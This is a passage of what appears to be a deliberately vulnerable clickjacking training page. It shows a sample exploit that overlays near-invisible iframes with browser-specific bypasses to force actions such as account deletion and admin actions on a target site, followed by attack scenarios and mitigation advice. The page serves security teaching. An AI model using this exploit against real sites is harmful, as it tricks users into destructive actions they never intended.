            const iframe = document.createElement('iframe');
            iframe.src = 'javascript:parent.performAction("follow_user")';
            iframe.style.position = 'absolute';
            iframe.style.top = '50%';
            iframe.style.left = '50%';
            iframe.style.transform = 'translate(-50%, -50%)';
            iframe.style.width = '350px';
            iframe.style.height = '250px';
            iframe.style.opacity = '0.01';
            iframe.style.zIndex = '5';
            document.body.appendChild(iframe);
        }
        
        function useSafariBypass() {
            // Safari-specific bypass
            const iframe = document.createElement('iframe');
            iframe.src = 'about:blank';
            iframe.style.position = 'absolute';
            iframe.style.top = '50%';
            iframe.style.left = '50%';
            iframe.style.transform = 'translate(-50%, -50%)';
            iframe.style.width = '350px';
            iframe.style.height = '250px';
            iframe.style.opacity = '0.01';
            iframe.style.zIndex = '5';
            document.body.appendChild(iframe);
            
            iframe.onload = () => {
                iframe.contentWindow.location = 'javascript:parent.performAction("share_content")';
            };
        }
        
        function useEdgeBypass() {
            // Edge-specific bypass
            const iframe = document.createElement('iframe');
            iframe.src = 'data:text/html,<script>parent.performAction("delete_account");</script>';
            iframe.style.position = 'absolute';
            iframe.style.top = '50%';
            iframe.style.left = '50%';
            iframe.style.transform = 'translate(-50%, -50%)';
            iframe.style.width = '350px';
            iframe.style.height = '250px';
            iframe.style.opacity = '0.01';
            iframe.style.zIndex = '5';
            document.body.appendChild(iframe);
        }
        
        function useGenericBypass() {
            // Generic bypass
            performAction('admin_action');
        }
        
        function performAction(action) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://vulnerable-site.com/clickjacking/4.php';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            
            form.appendChild(actionInput);
            document.body.appendChild(form);
            form.submit();
        }
    &lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;</div>
        </div>

        <div class="danger-zone">
            <h5><i class="bi bi-exclamation-triangle me-2"></i>Real-World Attack Scenarios</h5>
            <ul>
                <li>Admin panel manipulation and privilege escalation</li>
                <li>Mass user deletion and data destruction</li>
                <li>System command execution and server compromise</li>
                <li>Financial fraud and payment manipulation</li>
                <li>Account takeover and password changes</li>
                <li>Compliance violations and security breaches</li>
            </ul>
        </div>

        <div class="card mt-4">
            <div class="card-header">
                <i class="bi bi-lightbulb me-2"></i>Mitigation Strategies
            </div>
            <div class="card-body">
                <ul>
                    <li>Implement X-Frame-Options header (DENY, SAMEORIGIN)</li>
                    <li>Use Content Security Policy (CSP) frame-ancestors directive</li>
                    <li>Implement JavaScript-based clickjacking protection</li>
                    <li>Use SameSite cookie attributes</li>
                    <li>Regular security testing and vulnerability assessments</li>
                    <li>Monitor for unusual user actions</li>
                    <li>Implement proper authentication and authorization</li>
                    <li>Use CAPTCHA for sensitive actions</li>
                    <li>Implement rate limiting and request validation</li>
                    <li>Educate users about clickjacking attacks</li>
                    <li>Implement proper input validation</li>
                    <li>Use secure coding practices</li>
                </ul>
            </div>
        </div>
    </div>

    <script>
        function performAction(action) {
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = '';
            
            const actionInput = document.createElement('input');
            actionInput.type = 'hidden';
            actionInput.name = 'action';
            actionInput.value = action;
            
            form.appendChild(actionInput);
            document.body.appendChild(form);
            form.submit();
        }
        
        function setAction(action) {
            document.getElementById('hidden_action').value = action;
        }
        
        function testAdvancedClickjacking() {
            document.getElementById('action-results').innerHTML = 
                '<div class="alert alert-info">Advanced Clickjacking test initiated. Check the vulnerable actions above.</div>';
        }
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>
